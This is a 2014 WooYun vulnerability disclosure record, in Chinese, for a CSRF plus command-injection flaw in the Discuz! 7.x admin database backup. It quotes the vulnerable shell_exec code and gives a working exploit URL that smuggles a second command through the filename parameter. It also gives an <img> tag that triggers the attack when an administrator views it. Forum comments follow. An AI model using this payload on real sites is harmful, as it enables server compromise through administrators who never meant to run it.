{"id": 48783, "wybug_id": "wooyun-2014-076458", "wybug_title": "Discuz7.x csrf+系统命令调用（开关机，创建文件等等）", "wybug_corp": "Discuz!", "wybug_author": "menmen519", "wybug_date": "2014-09-18 09:15", "wybug_open_date": "2014-12-17 09:16", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向公众公开  简要描述： Discuz! csrf+系统命令调用，一个超级简单比拖数据库还来得快的get类型csrf，一张图片搞定管理员，只要管理员敢看一下，那么他就会自动执行系统命令，创建文件，删除文件，ping 等等命令，如果有权限，也可以开关机。求精华，这个应该比那个csrf脱裤危害比较巨大吧！！！！！ 详细说明：  直接分析代码：admin\\db.inc.php:(lines:270-287):\n$tablesstr = '';\t\t\tforeach($tables as $table) {\t\t\t\t$tablesstr .= '\"'.$table.'\" ';\t\t\t}\t\t\t\t\t\trequire './config.inc.php';\t\t\tlist($dbhost, $dbport) = explode(':', $dbhost);\t\t\t$query = $db->query(\"SHOW VARIABLES LIKE 'basedir'\");\t\t\tlist(, $mysql_base) = $db->fetch_array($query, MYSQL_NUM);\t\t\t$dumpfile = addslashes(dirname(dirname(__FILE__))).'/'.$backupfilename.'.sql';\t\t\t@unlink($dumpfile);\t\t\t\t\t\t$mysqlbin = $mysql_base == '/' ? '' : addslashes($mysql_base).'bin/';\t\t\t@shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($extendins == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $sqlcompat == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host=\"'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket=\"'.$dbport.'\"') : '').'\" --user=\"'.$dbuser.'\" --password=\"'.$dbpw.'\" \"'.$dbname.'\" '.$tablesstr.' > '.$dumpfile);\t\t\techo $dumpfile;\t\t\texit;\n这里我们打印了执行shell_exec 后的 代码 不影响全局，在7.x里面有一个bug，就是你在备份数据库的时候，发送的第一个post请求是有csrf防御，但是第二个获取相关信息的get请求，这面包括了一系列操作，没有做csrf防御，我们直接看这个链接：url：http://localhost/Discuz_7.2_SC_UTF8/upload/admincp.php?action=db&operation=export&type=custom&saveto=server&filename=ssss%20%26%20echo%20111%20>%20shell%20%26%20xxxxx&method=&sizelimit=2048&volume=1&tableid=111111111111&startfrom=0&extendins=0&sqlcharset=&sqlcompat=&exportsubmit=yes&usehex=&usezip=0&sid=&usezip=0本身这个链接的逻辑走向是当method=multivol的一个逻辑，这里是二次转发默认发送的，我们把这里值为空，那么就到了我们上面的代码了，看到这个url后进一步测试所有相关的参数，是否影响页面的走向逻辑，实际结果证明，所有参数可控我们看着一行代码：\n$dumpfile = addslashes(dirname(dirname(__FILE__))).'/'.$backupfilename.'.sql';\t\t\t@unlink($dumpfile);\t\t\t\t\t\t$mysqlbin = $mysql_base == '/' ? '' : addslashes($mysql_base).'bin/';\t\t\t@shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ? '--skip-opt --create-options' : '-all').' --add-drop-table'.($extendins == 1 ? ' --extended-insert' : '').''.($db->version() > '4.1' && $sqlcompat == 'MYSQL40' ? ' --compatible=mysql40' : '').' --host=\"'.$dbhost.($dbport ? (is_numeric($dbport) ? ' --port='.$dbport : ' --socket=\"'.$dbport.'\"') : '').'\" --user=\"'.$dbuser.'\" --password=\"'.$dbpw.'\" \"'.$dbname.'\" '.$tablesstr.' > '.$dumpfile);\n上面的文件操作，这里如果找不到，也已经被@规避了那么我们看这个很长的sql备份命令最后面的$dumpfile,这个参数完全可控，这里我就不分析代码了，拿现象说话：如果url中同时存在<> 那么它就会被阻断，但是我们实际中只用到一个>  或者 >>就够了她还过滤了点号和反斜杠，正斜杠，当然了这里我就证明了，我们不用这些符号就是了，实际操作中，既然能执行系统命令，各种二进制绕过，写shell 这里我就不演示了举例子说明，如果我们的filename=ssss那么这个命令 就会变成这样：\nd:/wamp/bin/mysql/mysql5.5.20bin/mysqldump --force --quick --skip-opt --create-options --add-drop-table --host=\"localhost\" --user=\"root\" --password=\"\" \"discuz17\" \"cdb_activities\" \"xxxxxx\\'\" > D:\\\\wamp\\\\www\\\\Discuz_7.2_SC_UTF8\\\\upload/./forumdata/backup_789c01/ssss\n那么我们通过&再连接一个命令就OK了，我们把filename改为：filename=ssss%20%26%20echo%20111%20>%20shell%20%26%20xxxxx然后再发一次包：\nd:/wamp/bin/mysql/mysql5.5.20bin/mysqldump --force --quick --skip-opt --create-options --add-drop-table --host=\"localhost\" --user=\"root\" --password=\"\" \"discuz17\" \"cdb_activities\" \"xxxxxx\\'\" > D:\\\\wamp\\\\www\\\\Discuz_7.2_SC_UTF8\\\\upload/./forumdata/backup_789c01/ssss & echo 111 > shell & xxxxx.sql\n看见没有 这个命令完全构造完毕，肯定是可以执行的，我们去这个目录看看，有没有一个文件叫shell内容为111的：\n\n看到没有 完美执行了，最可怕的事情就是，这个链接是一个纯get的csrf，一个图片就搞定<img src=http://localhost/Discuz_7.2_SC_UTF8/upload/admincp.php?action=db&operation=export&type=custom&saveto=server&filename=ssss%20%26%20echo%20111%20>%20shell%20%26%20xxxxx&method=&sizelimit=2048&volume=1&tableid=111111111111&startfrom=0&extendins=0&sqlcharset=&sqlcompat=&exportsubmit=yes&usehex=&usezip=0&sid=&usezip=0>然后发给管理员这张图片，呵呵 你说能不给闪电吗！！！！！   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-19 09:27 厂商回复： 感谢您提出的问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-18 09:19 |    \t\t假马 \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:18        | 我存在,你婶婶的脑海里.)\t\t \n  尸吊    \n     2014-09-18 09:20 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  恩  恩  恩   啊   啊    啊   come on     \n     2014-09-18 09:25 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  真他妈无语 这么简单一个csrf 不给精华 之前那个csrf脱裤的 那么多条件给精华，一帮人什么脑子，非要哥发怒    \n     2014-09-18 09:40 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  目测因为7.x太老了...    \n     2014-09-18 09:47 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  哥别怒阿，因为管理员都会审洞疲劳，第一个csrf给精华是因为看到了新意，精华一般都是给一个新思路的提出者。或者和管理有一腿走菊花，有些管理确实是太忙（大爷）了，发了好几个站内信都不回，问题都不予解答，所以也别怪某些白帽子去zone吐槽，因为qq不回、站短不回，貌似只有zone一个地方可以提出问题或者质疑公正了？    \n     2014-09-18 09:49 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @pandas 哎 ！！！  我是真服了 真的要按照你说的 给出一个前台完美shell..........    \n     2014-09-18 12:43 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  把csrf玩出了危害。膜拜    \n     2014-09-18 13:12 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  这个图片有限制吗？    \n     2014-09-18 13:43 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @子非海绵宝宝 没有限制    \n     2014-09-19 16:31 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  应该是一个新平台，只是调用一个外部的图片    \n     2014-09-20 00:04 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  还是备份那边那个 Msyqldump么 windows上不能用的把 好像    \n     2014-09-23 11:40 |    \t\t铁汉 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 向各种大神学习之)\t\t \n  你妹夫      \n     2014-09-24 10:55 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  @Matt 对的 不过鸡肋的是有水印的图是如何dump的。。。    \n     2014-09-25 22:06 |    \t\tzzzzy \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 熟练各种语言名称的拼写)\t\t \n  逆天了。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}